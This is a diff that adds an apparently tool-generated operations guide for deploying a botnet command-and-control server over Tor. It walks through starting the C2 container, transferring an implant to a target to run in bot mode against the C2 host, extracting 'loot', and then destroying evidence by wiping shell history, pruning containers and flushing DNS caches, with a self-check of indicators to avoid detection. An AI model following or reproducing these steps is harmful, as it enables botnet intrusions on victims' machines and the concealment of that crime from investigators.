@@ -1,0 +1,110 @@
+FORGE DEPLOYMENT GUIDE — BOTNET_C2_SERVER_WITH_AES_ENCRYPTED_COMM
+============================================================
+Generated: 2026-06-26 15:15 UTC
+OPSEC Level: FULL
+Deployment: DOCKER
+Routing: TOR
+Audit Score: 100/100 (Grade A)
+
+PRE-DEPLOYMENT CHECKLIST
+----------------------------------------
+  [ ] Verify VPN/Tor connectivity before deployment
+  [ ] Confirm target authorization (rules of engagement)
+  [ ] Set up out-of-band communication channel
+  [ ] Prepare clean VM/container for deployment
+  [ ] Verify DNS does not leak to ISP resolver
+  [ ] Disable host logging (or route to /dev/null)
+  [ ] Synchronize clocks to UTC
+  [ ] Review OPSEC audit findings (opsec_audit.txt)
+  [ ] Review threat model (3 MITRE techniques)
+  [ ] Verify Tor circuit established (check exit node IP)
+
+PHASE 1: INFRASTRUCTURE SETUP
+----------------------------------------
+  # 1. Build the container
+  docker-compose build
+
+  # 2. Start in detached mode
+  docker-compose up -d
+
+  # 3. Verify container is running
+  docker ps | grep forge-botnet_c2_server_with_aes_encrypted_comm
+
+  # 4. Verify network isolation
+  docker network inspect isolated
+
+  # 5. Verify Tor connectivity
+  docker exec forge-botnet_c2_server_with_aes_encrypted_comm curl -s --socks5 tor-proxy:9050 https://check.torproject.org/api/ip
+
+
+PHASE 2: OPERATIONAL USE
+----------------------------------------
+  # Start C2 server (inside container)
+  docker exec -it forge-botnet_c2_server_with_aes_encrypted_comm python3 /app/generated.py --mode server
+
+  # Deploy implant on target
+  # Transfer generated.py to target via out-of-band method
+  # On target: python3 generated.py --mode bot --host <C2_IP>
+
+  # Interactive controller
+  docker exec -it forge-botnet_c2_server_with_aes_encrypted_comm python3 /app/generated.py --mode controller
+
+
+PHASE 3: POST-OPERATION CLEANUP
+----------------------------------------
+  # 1. Extract any results/loot first
+  docker cp forge-botnet_c2_server_with_aes_encrypted_comm:/tmp/ ./results/
+
+  # 2. Run FORGE cleanup script (secure wipe + container destruction)
+  bash opsec/cleanup.sh
+
+  # 3. Manual verification
+  docker ps -a | grep forge    # should be empty
+  docker images | grep forge    # should be empty
+  docker volume ls              # verify no dangling volumes
+
+  # 4. Clean local traces
+  history -c && history -w      # bash history
+  > ~/.bash_history             # or zsh: > ~/.zsh_history
+  rm -rf /tmp/forge_*           # temp artifacts
+
+  # 5. Request new Tor identity (new circuit)
+  #    If using tor-proxy container, restart it for new exit node
+
+
+PHASE 4: EVIDENCE DESTRUCTION
+----------------------------------------
+  # Verify no Docker artifacts remain
+  docker system prune -af --volumes
+
+  # Verify no network connections to target remain
+  ss -tunap | grep <TARGET_IP>
+
+  # Verify no DNS cache entries
+  # Linux: systemd-resolve --flush-caches
+  # macOS: sudo dscacheutil -flushcache
+
+  # Verify no entries in /tmp/
+  ls -la /tmp/ | grep forge
+
+
+IOC SELF-ASSESSMENT
+----------------------------------------
+  Review these IOCs to verify you left no traces:
+
+  [NETWORK] Outbound connections on configured port
+    Check: network logs, PCAP
+  [NETWORK] Listening port on target
+    Check: netstat, port scan
+  [NETWORK] DNS queries to C2/exfil domain
+    Check: DNS logs, passive DNS
+  [BEHAVIORAL] Encryption activity (potential ransomware)
+    Check: entropy analysis, file monitoring
+
+NOTES
+----------------------------------------
+  • All timestamps in this guide are UTC
+  • Do not reuse infrastructure across operations
+  • Rotate exit nodes/VPNs between operations
+  • Never mix operational and personal traffic on same circuit
+  • Verify OPSEC audit score before deployment (target: A grade, 90+)
